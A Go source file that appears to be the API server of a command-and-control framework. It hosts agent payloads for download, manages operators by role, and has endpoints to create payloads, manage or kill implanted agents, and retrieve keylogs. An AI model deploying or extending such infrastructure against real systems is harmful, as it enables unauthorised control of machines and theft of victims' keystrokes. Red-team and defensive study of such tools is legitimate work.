package main

import (
    "fmt"
    "net/http"
    "path/filepath"
    "os"
    "strings"

    "github.com/PatronC2/Patron/lib/logger"
    "github.com/gin-gonic/gin"
)

func main() {
    OpenDatabase()
    InitDatabase()
    createAdminUser()
    
    r := gin.Default()

    // host payloads server
    workDir, _ := os.Getwd()
	filesDir := http.Dir(filepath.Join(workDir, "agents"))
    FileServer(r, "/files", filesDir)

    // handle logins
    r.POST("/login", loginHandler)

    readRoles := []string{"admin", "operator", "readOnly"}
    writeRoles := []string{"admin", "operator"}
    adminRoles := []string{"admin"}

    // Admin functions
    r.POST("/api/admin/users", Auth(adminRoles), createUserHandler)
    r.DELETE("/api/admin/users/:username", Auth(adminRoles), deleteUserByUsernameHandler)

    // POST / DELETE requests to non-admin areas use Auth(writeRoles)
    r.POST("/api/updateagent/:agt", Auth(writeRoles), updateAgentHandler)
    r.GET("/api/deleteagent/:agt", Auth(writeRoles), killAgentHandler)
    r.POST("/api/payload", Auth(writeRoles), createPayloadHandler)

    // GET requests to non-admin areas use Auth(readRoles)
    r.GET("/api/agents", Auth(readRoles), getAgentsHandler)
    r.GET("/api/groupagents", Auth(readRoles), getGroupAgents)
    r.GET("/api/groupagents/:ip", Auth(readRoles), getGroupAgentsByIP)
    r.GET("/api/oneagent/:agt", Auth(readRoles), getOneAgentByUUID)
    r.GET("/api/agent/:agt", Auth(readRoles), getAgentByUUID)
    r.GET("/api/keylog/:agt", Auth(readRoles), getKeylogHandler)
    r.GET("/api/payloads", Auth(readRoles), getPayloadsHandler)


    // Replace with your paths to the certificate and key files
    certFile := "certs/server.pem"
    keyFile := "certs/server.key"

    // Use RunTLS to enable SSL
    if err := r.RunTLS(":8443", certFile, keyFile); err != nil {
        logger.Logf(logger.Error, "Failed to run server: %v\n", err)
    }
}

func loginHandler(c *gin.Context) {
    var loginRequest struct {
        Username string `json:"username"`
        Password string `json:"password"`
    }
    if err := c.ShouldBindJSON(&loginRequest); err != nil {
        c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request"})
        return
    }

    user, err := getUserByUsername(loginRequest.Username)
	fmt.Println("loginHandler getUser", user)
    if err != nil || user.CheckPassword(loginRequest.Password) != nil {
		if err != nil {
			fmt.Println("login error", err)
		}
        c.JSON(http.StatusUnauthorized, gin.H{"error": "Invalid credentials"})
        return
    }

    token, err := GenerateJWT(user.Username, user.Role)
    if err != nil {
        c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to generate token"})
        return
    }

    c.JSON(http.StatusOK, gin.H{"token": token})
}

func FileServer(r *gin.Engine, path string, root http.FileSystem) {
	if strings.ContainsAny(path, "{}*") {
		panic("FileServer does not permit any URL parameters.")
	}

	if path != "/" && path[len(path)-1] != '/' {
		r.GET(path, func(c *gin.Context) {
			c.Redirect(http.StatusMovedPermanently, path+"/")
		})
		path += "/"
	}
	r.StaticFS(path, root)
}